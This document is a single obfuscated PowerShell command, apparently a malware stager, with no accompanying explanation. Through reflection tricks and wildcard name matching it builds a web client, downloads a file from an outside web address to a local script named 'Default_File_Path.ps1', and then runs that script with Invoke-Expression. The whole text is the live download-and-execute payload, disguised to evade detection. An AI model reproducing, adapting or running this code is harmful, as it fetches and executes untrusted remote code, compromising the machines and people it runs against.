Set-Variable oy 'Default_File_Path.ps1';SV S 'http://www.hosttec.net.br/DBN/pdf/index.html';SI Variable:bI 'Net.WebClient';item *z;Set-Item Variable:/G6E (&$ExecutionContext.(($ExecutionContext|Member)[6].Name).GetCommand($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name).PsObject.Methods|Where{(Variable _ -Val).Name-ilike'*dName'}).Name).Invoke('N*-O*',$TRUE,$TRUE),[Management.Automation.CommandTypes]::Cmdlet)(Get-Item Variable:/bI).Value);Set-Item Variable:/Z ((((GV G6E).Value|Member)|Where{(Variable _ -Val).Name-ilike'D*ad*i*e'}).Name);(GV G6E).Value.((ChildItem Variable:Z).Value).Invoke((LS Variable:/S).Value,(Item Variable:/oy).Value);Invoke-Expression (-Join([Text.Encoding]::ASCII.GetString([IO.File]::ReadAllBytes((Item Variable:/oy).Value))))
